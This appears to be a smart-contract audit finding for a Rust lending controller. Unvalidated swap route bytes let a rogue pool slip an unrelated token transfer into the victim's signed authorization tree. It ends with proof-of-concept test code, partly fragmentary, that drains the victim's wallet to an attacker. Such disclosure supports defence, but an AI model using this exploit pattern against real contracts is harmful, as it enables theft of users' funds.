### Title
Attacker-controlled swap routes can smuggle unauthorized token transfers into the caller’s authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
The controller accepts an opaque `swap: Bytes` route for `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral`, then forwards it to the configured router without binding it to trusted venues or expected downstream authorizations. A route-selected contract can call an unrelated token’s `transfer` beneath the caller’s `require_auth`; simulation then records that transfer as a child authorization, and execution succeeds if the caller signs the resulting tree. This is analogous to treating an untrusted pathname as an executable command: attacker-controlled route data becomes code execution under the caller’s authority.

### Finding Description
`swap_collateral` accepts the caller-supplied `swap` byte string and passes it into `process_swap_collateral`, which forwards it through `withdraw_and_swap_from_supply`. [1](#0-0) [2](#0-1)  `swap_debt`, `multiply`, and `repay_debt_with_collateral` expose the same route-controlled pattern. [3](#0-2) [4](#0-3) [5](#0-4) 

The controller only authorizes one exact `token_in.transfer(controller, router, amount_in)` on behalf of the controller, then invokes `execute_strategy(controller, amount_in, swap)` with the opaque payload unchanged. [6](#0-5) [7](#0-6)  It validates only controller balance deltas afterward: no input gain, no overspend, refund of unused input, and positive output. [8](#0-7) 

Those checks do not constrain what a route-named venue does under the caller’s authorization. The included regression test models a router that invokes the `hop_pool` address decoded from the route payload, followed by a rogue pool that calls `token.transfer(victim, attacker, amount)`. [9](#0-8) [10](#0-9)  Simulation records the unrelated wallet-token transfer as a child of the victim’s `swap_collateral` authorization and drains the victim’s unrelated token balance. [11](#0-10)  Enforced authorization rejects the rogue transfer under a root-only tree but executes it when the simulated poisoned tree is signed. [12](#0-11) 

### Impact Explanation
A malicious route can steal tokens held in the invoking user’s wallet that are entirely unrelated to the lending operation. The protocol’s measured input and output checks can still pass because the router can return fair output while the route-selected contract performs an additional attacker-beneficial token transfer. [13](#0-12)  The theft is limited to authorizations the victim actually signs, but ordinary simulation can produce the poisoned authorization tree and embed the theft beneath an otherwise valid strategy call. [14](#0-13) 

### Likelihood Explanation
Any unprivileged user can reach the vulnerable surface through `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` by supplying route bytes. [15](#0-14) [5](#0-4)  The controller does not decode or venue-allowlist the route before dispatch, and the regression test demonstrates that a pool address selected by the payload can reach an unrelated token transfer. [16](#0-15) [17](#0-16)  Exploitation requires the victim to sign an authorization tree containing the extra transfer, which lowers likelihood compared with a purely unauthenticated contract flaw, but the opaque route makes that child authorization non-obvious to users and clients.

### Recommendation
Do not treat route bytes as trusted executable dispatch data. Decode and validate the route before execution, restrict every pool, venue, token, and callback target to a protocol-approved registry, and reject routes that introduce contracts outside the declared venue set. [18](#0-17) 

Additionally, require clients and integrations to compare the complete simulated authorization tree with an explicitly expected tree for each strategy, not merely verify the top-level function and token amount. [19](#0-18)  The expected tree should contain only the documented transfers required by the strategy; any unrelated token transfer, approval, or nested invocation should abort signing. [20](#0-19) 

### Proof of Concept
The repository’s regression test demonstrates the complete pattern:

1. Alice supplies USDC and holds an unrelated wallet token. [21](#0-20) 
2. The attacker-controlled route encodes a `hop_pool`, fair `min_out`, `token_in`, and `token_out`. [22](#0-21) [17](#0-16) 
3. The router pulls the expected `token_in`, invokes the route-selected `hop_pool`, and returns fair `token_out`. [23](#0-22) 
4. The rogue pool calls `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`. [24](#0-23) 
5. Simulation records that unrelated transfer as a child of Alice’s `swap_collateral` authorization. [25](#0-24) 
6. A root-only signed tree rejects the route, while signing the simulated tree containing the child transfer executes it and moves Alice’s entire unrelated wallet-token balance to the attacker. [26](#0-25)

/// call on `token_addr` made deeper in the next contract call (for example by

    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
}

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),

            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),

        sub_invocations: std::vec![],
    };

        function: AuthorizedFunction::Contract((

fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
